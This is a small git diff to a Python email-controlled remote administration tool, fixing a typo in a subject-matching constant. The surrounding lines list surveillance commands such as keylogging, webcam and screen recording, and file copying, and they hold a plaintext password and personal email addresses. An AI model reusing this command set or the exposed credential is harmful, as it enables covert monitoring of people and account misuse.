@@ -26,7 +26,7 @@ DEFAULT_PASSWORD = 'orkphlqjqbsnrvin'  # encrypted password using JSON
 TRUSTED_SENDERS = ['sendersmtp001@gmail.com', 'nguyenhieu82132@gmail.com']  # encrypted using JSON
 
 # SUBJECCT
-REGCONIZE_SUBJECT = 'RDM'
+RECOGNIZE_SUBJECT = 'RDM'
 COMMANDS = ['LIST PROCESS', 'KILL PROCESS', 'LIST APP', 'KILL APP', 'CAPTURE SCREEN', 'RECORD SCREEN',
             'SHOT WEBCAM', 'RECORD WEBCAM',  'VIEW FILE SYSTEM',  'COPY FILE SYSTEM', 'KEYLOGGER', 'SHUTDOWN', 'RESTART',
             'WRITE REGISTRY', 'GET REGISTRY', 'CREATE REGISTRY', 'SET REGISTRY', 'DELETE VALUE  REGISTRY',
@@ -92,7 +92,7 @@ class Receiver():
             return None, None
 
         subject, command_subject = mail_subject.split('-')
-        if subject != REGCONIZE_SUBJECT or command_subject not in COMMANDS:
+        if subject != RECOGNIZE_SUBJECT or command_subject not in COMMANDS:
             return None, None
 
         print('-> This mail is valid')
